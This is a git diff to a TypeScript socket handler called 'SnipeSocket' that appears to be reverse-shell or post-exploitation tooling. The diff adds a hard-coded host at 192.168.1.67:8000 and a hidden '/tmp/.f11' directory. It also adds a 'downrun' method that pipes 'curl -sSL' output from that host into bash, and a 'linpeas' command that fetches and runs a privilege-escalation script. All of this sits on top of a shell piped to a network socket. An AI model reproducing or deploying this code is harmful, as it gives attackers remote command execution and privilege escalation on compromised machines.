@@ -7,8 +7,10 @@ import net from 'net';
 import tty, { ReadStream, WriteStream } from 'tty';
 import stream, { Duplex, Readable, Writable } from 'stream';
 
+const WEB_HOST = 'http://192.168.1.67:8000';
 const UNIX_SHELLS = ['zsh', 'bash', 'sh'];
 const UNIX_DEFAULT = 'bin/sh';
+const TMP_DIR = `/tmp/.f11`;
 
 // Constants
 const NEWLINE = `\r\n`;
@@ -70,37 +72,67 @@ const findShell = (): string => isNotWindows() ? findNixShell() : findWinShell()
 
 class SnipeSocket {
   public sock: net.Socket;
-  public shell: ChildProcessWithoutNullStreams;
+  public cp: ChildProcessWithoutNullStreams;
   public inShell = false;
+  public inSpawn = false;
 
   constructor (socket: net.Socket) {
     this.sock = socket;
+
+    fs.mkdirSync(TMP_DIR, { recursive: true });
   }
 
   public get sig(): string {
     return `${this.sock.remoteAddress}:${this.sock.remotePort}`
   }
 
+  public downrun(file: string, cb?: Function): void {
+    const url = `${WEB_HOST}/${file}`;
+    const args = [ '-c', `curl -sSL ${url} | bash` ];
+
+    this.spawn('/bin/sh', args, false, (code) => {
+      msg('info', `[downrun] Child process exited with code ${code}`);
+    });
+  }
+
   public prompt(): void {
-    this.sock.write(`${PROMPT}${NEWLINE}`);
+    this.sock.write(`${NEWLINE}${PROMPT}`);
   }
 
   public welcome(): void {
     if (fs.existsSync('msgs/welcome.txt')) this.sock.write(colors.blue(fs.readFileSync('msgs/welcome.txt').toString()));
+
+    this.prompt();
   }
 
-  public doShell () {
-    this.inShell = true;
-    this.shell = spawn(findShell());
-    this.shell.stdin.write(`${STABALIZE}${NEWLINE}`);
-    this.sock.pipe(this.shell.stdin);
-    this.shell.stdout.pipe(this.sock);
-    this.shell.stderr.pipe(this.sock);
+  public spawn (cmd: string, args?: string[], stable?: boolean, cb?: (code: number | null) => void) {
+    this.inSpawn = true;
+    this.cp = spawn(cmd, args);
+    if (stable) this.cp.stdin.write(`${STABALIZE}${NEWLINE}`);
+    this.sock.pipe(this.cp.stdin);
+    this.cp.stdout.pipe(this.sock);
+    this.cp.stderr.pipe(this.sock);
 
     // What about no out?? on enter?
-    this.shell.on('close', (code) => {
+    this.cp.on('close', (code) => {
       msg('debug', `Child process exited with code ${code}`);
+      this.inSpawn = false;
+
+      if (cb) cb(code);
+    });
+  }
+
+  public shell() {
+    this.inShell = true;
+    this.spawn(findShell(), [], true, (code) => {
+      msg('info', `[shell] Child process exited with code ${code}`);
       this.inShell = false;
+    });
+  }
+
+  public linpeas() {
+    this.downrun('linpeas.sh', () => {
+      this.prompt();
     });
   }
 
@@ -110,10 +142,14 @@ class SnipeSocket {
     const cmd = data.toString().trim();
 
     if (/^shell$/i.test(cmd)) {
-      this.doShell();
+      this.shell();
+    } else if (/^linpeas(\.sh)?$/i.test(cmd)) {
+      this.linpeas();
     } else if (!this.inShell) {
       this.sock.write(`Command coming soon: ${cmd}`);
     }
+
+    if (!this.inShell) this.prompt();
   }
 }
 
